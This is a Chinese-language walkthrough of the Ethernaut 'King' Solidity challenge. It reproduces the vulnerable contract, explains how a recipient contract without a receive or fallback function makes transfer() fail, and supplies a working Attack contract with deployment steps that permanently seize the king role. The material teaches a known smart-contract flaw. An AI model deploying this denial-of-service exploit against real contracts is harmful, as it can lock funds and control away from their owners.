# King
King這一關要求我們的地址成爲合約中的國王，并且防止任何人重新奪回王位。主要考察了solidity中發送Ether相關的知識，讓我們先看代碼。

## 合约代碼
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```
## 代碼分析
合約中值得分析的地方主要是在`receive`函數,這個函數會在合約收到Ether，并且`msg.data`為空時被調用。在這個函數中，首先會檢查`msg.value`是否大於等於原本的`prize`或者`msg.sender`是否為`owner`,如果是的話，就會把`msg.value`轉給原本的`king`,之後將`king`的地址改爲`msg.sender`,`prize`的值改爲`msg.value`。

問題就在於，我們是否可以在`payable(king).transfer(msg.value)`這一步使轉賬失敗，那麽就可以使得king的地址永遠不發生改變，來達到我們的目的。

這裏我們將部署一個合約作爲我們的地址，而如果合約内部不存在`receive`或是`fallback`函數，儅有任意一方想通過`transfer`轉賬Ether給我們的合約，交易都會失敗。關於這部分的解釋可以參考官方文檔：
>Contracts that receive Ether directly (without a function call, i.e. using `send` or `transfer`) but do not define a receive Ether function or a payable fallback function throw an exception, sending back the Ether (this was different before Solidity v0.4.0). 

另外一點在於我們需要使用`call`來調用`King`合約的`receive`函數，因為`send`和`transfer`僅允許使用2300 gas，所以我們要使用`call`來調用`King`合約的`receive`函數。

## 攻擊代碼
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
  constructor(address payable _target) payable {
    (bool success,) = _target.call{value:msg.value}("");
    require(success, "Failed to send Ether");
  }
}

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```

## 攻擊過程
1. 編譯合約，先找到`King`合約後呼叫合約取得`prize`的數值
2. 部署`Attack`合約，`_target`為`King`合約的地址，`msg.value`為我們之前查詢到的`prize`數值，部署完成後即完成本關。
